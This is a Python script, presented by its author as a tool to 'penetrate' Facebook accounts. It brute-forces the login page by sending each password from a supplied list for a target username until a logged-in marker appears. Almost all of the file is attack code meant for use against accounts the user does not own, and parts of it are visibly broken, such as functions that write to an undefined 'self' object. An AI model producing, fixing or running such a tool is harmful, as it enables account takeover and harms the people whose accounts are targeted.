import mechanize
import logging
import sys, os, argparse , random , time , re


def print_logo():
    clear = "\x1b[0m"
    colors = [34 , 37]

    x = '''
	==================================
	|            TA-FBF              |
	|     Greetz to n00b's Teams     |
	|--------------------------------|
	|   CoDeD By TA Hacker (@391F)   |
	|--------------------------------|
	'''
    for N , line in enumerate ( x.split ( "\n" ) ):
        sys.stdout.write ( "\x1b[1;%dm%s%s\n" % (random.choice ( colors ) , line , clear) )
        time.sleep ( 0.03 )

parser = argparse.ArgumentParser(description="[==] This simple script to penetrate accounts Facebook brute-force")
parser.add_argument('-u', required=True, default=None, help='Target username or email')
parser.add_argument('-p', required=True, default=None, help='Password list / Path of password file.')
args = vars(parser.parse_args())

b = mechanize.Browser()
b.set_handle_equiv(True)
b.set_handle_redirect(True)
b.set_handle_referer(True)
b.set_handle_robots(False)
b._factory.is_html = True
b.addheaders = [('User-agent','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/45.0.2454101')]

username = args['u']
passwordList = args['p']

if os.path.exists(args['p']) == False:
    sys.exit("[!] password file does not exist !")
def self():
    self.r = '\033[31m'
    self.g = '\033[32m'
    self.y = '\033[33m'
    self.b = '\033[34m'
    self.m = '\033[35m'
    self.c = '\033[36m'
    self.w = '\033[37m'
    self.rr = '\033[39m'

def Facebook():
    self.r = '\033[31m'
    self.g = '\033[32m'
    self.y = '\033[33m'
    password = open ( passwordList ).read ( ).splitlines ( )
    try_login = 0
    print (self.y + "[==] Target Account: {}".format ( username ) )
    for password in password:
        try_login += 1
        if try_login == 10:
            try_login = 0

        sys.stdout.write (self.y +'\r[==] {} '.format ( password ) )
        sys.stdout.flush ( )
        url = "https://www.facebook.com/login.php"
        try:
            response = b.open ( url , timeout=5 )
            b.select_form ( nr=0 )
            b.form['email'] = username
            b.form['pass'] = password
            b.method = "POST"
            response = b.submit ()
            if 'Find Friends' in response.read ( ):
                print (self.g + "[^] True\n[==] Password Found: {} ".format ( password ) )
                break
            else:
                print(self.r + "==> False ".format(password))
        except:
            sys.stdout.write ( '' )
            sys.stdout.flush ( )

if __name__ == '__main__':
    print_logo()
    Facebook()
    self()
